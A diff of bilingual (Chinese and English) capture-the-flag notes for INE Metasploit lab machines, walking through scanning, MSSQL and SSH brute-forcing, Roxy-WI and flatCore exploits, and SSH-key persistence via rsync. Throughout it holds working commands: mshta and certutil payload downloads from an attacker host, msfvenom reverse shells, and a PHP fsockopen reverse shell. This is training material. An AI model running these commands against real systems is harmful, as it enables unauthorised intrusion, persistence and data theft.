@@ -2,17 +2,15 @@
 	強調 Windows 環境中與錯誤配置的帳戶、暴露的目錄和不當的權限管理相關的風險
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target.ine.local
-	1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020.00; SP3
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	| ms-sql-info: 
-	|   10.0.23.174\MSSQLSERVER: 
-	|     Instance name: MSSQLSERVER
+		1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020.00; SP3
+		| ms-sql-info: 
+		|   10.0.23.174\MSSQLSERVER: 
+		|     Instance name: MSSQLSERVER
 
 	ifconfig (10.10.43.9)
 	msfconsole -q
-
-	searchsploit Microsoft SQL Server 
-	search Microsoft SQL Server 2012
+		searchsploit Microsoft SQL Server 
+		search Microsoft SQL Server 2012
 
 	存取目標電腦上的 MSSQLSERVER 
 	Windows 設定資料夾
@@ -21,14 +19,15 @@
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	使用 mshta 負載在 netcat 中取得反向 shell，使用 mssql_exec 執行它，
 	使用 certutil 提升到傳輸 .exe 負載的 meterpreter 會話。
-	使用 getsystem 升級權限。取得 shell (cmd) powershell 向我拋出錯誤。到 C:\ 並在 cmd 中「dir /S /B | findtstr /I “flag*” 並使用 type 指令取得所有標誌
+	使用 getsystem 升級權限。取得 shell (cmd) powershell 向我拋出錯誤。
+ 	到 C:\ 並在 cmd 中「dir /S /B | findtstr /I “flag*” 並使用 type 指令取得所有標誌
 
 	dir /S /B | findstr /I "flag*"
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/mssql/mssql_version
-	[+] target.ine.local:1433 - Version: 11.0.6020
-	[+] target.ine.local:1433 - Encryption: unsupported
+		[+] target.ine.local:1433 - Version: 11.0.6020
+		[+] target.ine.local:1433 - Encryption: unsupported
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/mssql/mssql_login 
 		use auxiliary/scanner/mysql/mysql_login
@@ -39,22 +38,21 @@
 		set RPORT 1433
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use  use auxiliary/scanner/mssql/mssql_ping
-	[+] 10.0.23.174:          -    ServerName      = WIN-5BQ22OKH4SO
-	[+] 10.0.23.174:          -    InstanceName    = MSSQLSERVER
-	[+] 10.0.23.174:          -    IsClustered     = No
-	[+] 10.0.23.174:          -    Version         = 11.0.6020.0
-	[+] 10.0.23.174:          -    tcp             = 1433
+		[+] 10.0.23.174:          -    ServerName      = WIN-5BQ22OKH4SO
+		[+] 10.0.23.174:          -    InstanceName    = MSSQLSERVER
+		[+] 10.0.23.174:          -    IsClustered     = No
+		[+] 10.0.23.174:          -    Version         = 11.0.6020.0
+		[+] 10.0.23.174:          -    tcp             = 1433
 
 	hydra -l sa -p '' 10.0.23.174 mssql  
-	[1433][mssql] host: 10.0.23.174   login: sa
+		[1433][mssql] host: 10.0.23.174   login: sa
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/admin/mssql/mssql_enum 
-	set RHOSTS target.ine.local
-	set USERNAME  sa
-	set PASSWORD ''
-	set DATABASE ''
-
+		set RHOSTS target.ine.local
+		set USERNAME  sa
+		set PASSWORD ''
+		set DATABASE ''
 
 	[*] 10.0.23.174:1433 - Windows Logins on this Server:
 	[*] 10.0.23.174:1433 -  ATTACKDEFENSE\Administrator
@@ -70,52 +68,51 @@
 	mshta.exe http://10.10.43.8:8080/A67Ez5R.hta
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/admin/mssql/mssql_exec
-	set CMD mshta.exe http://10.10.43.8:8080/A67Ez5R.hta
-	set RHOSTS target.ine.local
-	set USERNAME  sa
-	set PASSWORD ''
-	set DATABASE ''
-	run
+		set CMD mshta.exe http://10.10.43.8:8080/A67Ez5R.hta
+		set RHOSTS target.ine.local
+		set USERNAME  sa
+		set PASSWORD ''
+		set DATABASE ''
+		run
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		sessions -i 1
+		meterpreter > getsystem (root)
+		powershell 
+		Get-ChildItem -Path C:\ -Filter "flag*" -Recurse
+		cat C:\\Users\\Administrator\\Desktop\\flag4.txt
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		C:\flag1.txt 
+		C:\Windows\System32\config\flag2.txt 
+		C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt 
+		C:\Users\Administrator\Desktop\flag4.txt
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	sessions -i 1
-	meterpreter > getsystem (root)
-	powershell 
-	Get-ChildItem -Path C:\ -Filter "flag*" -Recurse
-	cat C:\\Users\\Administrator\\Desktop\\flag4.txt
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	C:\flag1.txt 
-	C:\Windows\System32\config\flag2.txt 
-	C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt 
-	C:\Users\Administrator\Desktop\flag4.txt
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	other method : 
-	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f hta-psh -o payload.hta
-	python3 -m http.server 80
-	nc -lvnp 1234
-	cmd: 'mshta http://<attacker_ip>/payload.hta'
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter shell: 
-	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f exe -o shell.exe
-	certutil.exe -urlcache - split -f http://<attacker_ip>/shell.exe shell.exe
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	#use multi/handler, set lhost,lport 選項與payload設定相同
-	useexploit/multi/handler 
-	setpayloadwindows /x64/meterpreter/ 
-	reverse_tcpsetLHOST <your_IP> 
-	setLPORT <your_port> 
-	exploit
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	cmd: .\shell.exe
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	getsystem
+	Other method : 
+		msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f hta-psh -o payload.hta
+		python3 -m http.server 80
+		nc -lvnp 1234
+		cmd: 'mshta http://<attacker_ip>/payload.hta'
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter shell: 
+		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f exe -o shell.exe
+		certutil.exe -urlcache - split -f http://<attacker_ip>/shell.exe shell.exe
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		#use multi/handler, set lhost,lport 選項與payload設定相同
+		useexploit/multi/handler 
+		setpayloadwindows /x64/meterpreter/ 
+		reverse_tcpsetLHOST <your_IP> 
+		setLPORT <your_port> 
+		exploit
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		cmd: .\shell.exe
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		getsystem
 # Host & Network Penetration Testing: The Metasploit Framework CTF 2
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target1.ine.local 
-	873/tcp open  rsync   (protocol version 31)
+		873/tcp open  rsync   (protocol version 31)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	了解正在執行的服務及其版本 : Banner Grabbing (橫幅抓取)
-	nc -nv 192.82.161.3 873
-	@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
+		nc -nv 192.82.161.3 873
+		@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV --script "rsync-list-modules" -p 873 target1.ine.local
 
@@ -123,9 +120,9 @@
 	set RHOSTS target1.ine.local 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	枚舉共享
-	rsync target1.ine.local::
+		rsync target1.ine.local::
 	=> 允許匿名未經驗證的存取
-	backupwscohen   FLAG1_9d290f5943514531b7a6493cec75c4aa 
+		backupwscohen   FLAG1_9d290f5943514531b7a6493cec75c4aa 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	詳細枚舉以查看文件和權限
 	rsync -av --list-only rsync://target1.ine.local/backupwscohen
@@ -134,7 +131,7 @@
 	-rw-r--r--             20 2024/10/28 15:05:40 TPSData.txt                                                         
 	-rw-r--r--             25 2024/10/28 15:05:40 office_staff.vhd                                                    
 	-rw-r--r--             39 2025/01/18 21:23:32 pii_data.xlsx   
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	DOWNLOAD: 
 	rsync -av rsync://target1.ine.local/backupwscohen/ .
 
@@ -142,61 +139,60 @@
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	上傳
-	nano test 
-	rsync test target1.ine.local::backupwscohen
+		nano test 
+		rsync test target1.ine.local::backupwscohen
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	CHECK: 
-	rsync -av --list-only rsync://target1.ine.local/backupwscohen
+		rsync -av --list-only rsync://target1.ine.local/backupwscohen
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	在本地建立.ssh目錄和authorized_keys檔案
-	cd Desktop
-	mkdir .ssh && touch .ssh/authorized_keys
+		cd Desktop
+		mkdir .ssh && touch .ssh/authorized_keys
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Generate SSH Keys  : 
-	cd .ssh
-	ssh-keygen -t rsa -b 4096
-	cp id_rsa.pub /root/Desktop/.ssh/authorized_keys
+		cd .ssh
+		ssh-keygen -t rsa -b 4096
+		cp id_rsa.pub /root/Desktop/.ssh/authorized_keys
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	獲得持久
-	rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
+		rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	將.ssh目錄的內容上傳
-	cd Desktop
-	rsync -r ./.ssh/ target1.ine.local::backupwscohen/.ssh
-
+		cd Desktop
+		rsync -r ./.ssh/ target1.ine.local::backupwscohen/.ssh
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	測試身份驗證
-	rsync -r target1.ine.local::backupwscohen/.ssh
-
+		rsync -r target1.ine.local::backupwscohen/.ssh
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	機器私鑰來執行 SSH 命令
-	ssh -i id_rsa backupwscohen@target1.ine.local -p 873
-
+		ssh -i id_rsa backupwscohen@target1.ine.local -p 873
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target2.ine.local 
-	80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
+		80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	dirb http://target2.ine.local 
-	--- Scanning URL: http://target2.ine.local/ ----
-	==> DIRECTORY: http://target2.ine.local/api/                                                                     
-	==> DIRECTORY: http://target2.ine.local/app/                                                                     
-	+ http://target2.ine.local/cgi-bin/ (CODE:403|SIZE:282)                                                          
-	==> DIRECTORY: http://target2.ine.local/configs/                                                                 
-	==> DIRECTORY: http://target2.ine.local/inc/                                                                     
-	+ http://target2.ine.local/index.html (CODE:200|SIZE:3520)                                                       
-	==> DIRECTORY: http://target2.ine.local/javascript/                                                              
-	==> DIRECTORY: http://target2.ine.local/keys/                                                                    
-	+ http://target2.ine.local/LICENSE (CODE:200|SIZE:11357)                                                         
-	==> DIRECTORY: http://target2.ine.local/log/                                                                     
-	+ http://target2.ine.local/server-status (CODE:403|SIZE:282)   
+		--- Scanning URL: http://target2.ine.local/ ----
+		==> DIRECTORY: http://target2.ine.local/api/                                                                     
+		==> DIRECTORY: http://target2.ine.local/app/                                                                     
+		+ http://target2.ine.local/cgi-bin/ (CODE:403|SIZE:282)                                                          
+		==> DIRECTORY: http://target2.ine.local/configs/                                                                 
+		==> DIRECTORY: http://target2.ine.local/inc/                                                                     
+		+ http://target2.ine.local/index.html (CODE:200|SIZE:3520)                                                       
+		==> DIRECTORY: http://target2.ine.local/javascript/                                                              
+		==> DIRECTORY: http://target2.ine.local/keys/                                                                    
+		+ http://target2.ine.local/LICENSE (CODE:200|SIZE:11357)                                                         
+		==> DIRECTORY: http://target2.ine.local/log/                                                                     
+		+ http://target2.ine.local/server-status (CODE:403|SIZE:282)   
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
-	search Roxy-WI
-	use exploit/linux/http/roxy_wi_exec 
-	set RHOSTS target2.ine.local 
-	set LHOST 192.82.161.2
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	cd /
-	FLAG3_992a61403a274195a08ade28edb1794e
+		search Roxy-WI
+		use exploit/linux/http/roxy_wi_exec 
+		set RHOSTS target2.ine.local 
+		set LHOST 192.82.161.2
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		cd /
+		FLAG3_992a61403a274195a08ade28edb1794e
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	自動化任務//正在運行 ps
 	=> Cron Jobs
@@ -223,81 +219,79 @@
 	
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target1.ine.local
-	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
-	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-	| http-cookieflags:   
-	|   /:  
-	|    PHPSESSID: 
-	|_      httponly flag not set  
-	|_http-generator:flatCore (cms)                    
-	|_http-title: Homepage 
-	|_http-server-header: Apache/2.4.41 (Ubuntu)
-	| http-robots.txt: 4 disallowed entries 
-	|_/acp/ /core/ /lib/ /modules/
+		22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+		80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+		| http-cookieflags:   
+		|   /:  
+		|    PHPSESSID: 
+		|_      httponly flag not set  
+		|_http-generator:flatCore (cms)                    
+		|_http-title: Homepage 
+		|_http-server-header: Apache/2.4.41 (Ubuntu)
+		| http-robots.txt: 4 disallowed entries 
+		|_/acp/ /core/ /lib/ /modules/
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	dirb http://target1.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	searchsploit flatCore
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	FlatCore CMS 2.0.7 - Remote Code Execution (RCE) (Authenticated)    | php/webapps/50262.py
+		FlatCore CMS 2.0.7 - Remote Code Execution (RCE) (Authenticated)    | php/webapps/50262.py
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	searchsploit -m 50262
-	python3 50262.py http://target1.ine.local admin password1
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	php -r '$sock=fsockopen("192.9.169.2",1235);exec("/bin/bash -i <&3 >&3 2>&3");'
-	nc -lvnp 1234
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	FLAG1{304c136f3ee64d6093681bf6f5808e48}
+		python3 50262.py http://target1.ine.local admin password1
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		php -r '$sock=fsockopen("192.9.169.2",1235);exec("/bin/bash -i <&3 >&3 2>&3");'
+		nc -lvnp 1234
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		FLAG1{304c136f3ee64d6093681bf6f5808e48}
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
-	use exploit/multi/handler
-	set LHOST 192.9.169.2
-	set payload linux/x86/shell/reverse_tcp
-	set LPORT 1235
-	exploit
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	sessions -u 1
+		use exploit/multi/handler
+		set LHOST 192.9.169.2
+		set payload linux/x86/shell/reverse_tcp
+		set LPORT 1235
+		exploit
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		sessions -u 1
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	meterpreter > shell
-	$ cat /etc/passwd (user)
-	iamaweakuser:x:1000:1000::/home/iamaweakuser:/bin/bash
+		$ cat /etc/passwd (user)
+		iamaweakuser:x:1000:1000::/home/iamaweakuser:/bin/bash
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	hydra -l iamaweakuser -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local ssh
 	
-	[22][ssh] host: target1.ine.local   login: iamaweakuser   password: angel
+		[22][ssh] host: target1.ine.local   login: iamaweakuser   password: angel
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ssh iamaweakuser@target1.ine.local 
-	FLAG2{ea13c4f5c7b44c27b7c23642b80fe985}
+		FLAG2{ea13c4f5c7b44c27b7c23642b80fe985}
 	
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target2.ine.local
-	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
-	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-	|_http-server-header: Apache/2.4.41 (Ubuntu)
-	|_http-title: sample_site
-	|_http-generator: WordPress 6.1
+		22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+		80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+		80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+		|_http-server-header: Apache/2.4.41 (Ubuntu)
+		|_http-title: sample_site
+		|_http-generator: WordPress 6.1
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap --script=http-wordpress-enum target2.ine.local
-	
-	| http-wordpress-enum: 
-	| Search limited to top 100 themes/plugins
-	|   plugins
-	|     akismet 5.0.1
-	|_    duplicator 1.3.26
+		| http-wordpress-enum: 
+		| Search limited to top 100 themes/plugins
+		|   plugins
+		|     akismet 5.0.1
+		|_    duplicator 1.3.26
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	dirb http://target2.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	searchsploit duplicator
-	Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Met | php/webapps/49288.rb
+		Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Met | php/webapps/49288.rb
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/http/wp_duplicator_file_read
-	set RHOSTS target2.ine.local
-	set filepath /flag3.txt
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	set filepath /etc/passwd
-	iamacrazyfreeuser:x:1000:1000:,,,:/home/iamacrazyfreeuser:/bin/bash
+		set RHOSTS target2.ine.local
+		set filepath /flag3.txt
+
+		set filepath /etc/passwd
+		iamacrazyfreeuser:x:1000:1000:,,,:/home/iamacrazyfreeuser:/bin/bash
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	hydra -l iamacrazyfreeuser -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target2.ine.local ssh
 	if show all => mean no password !!!!!!!!!!!
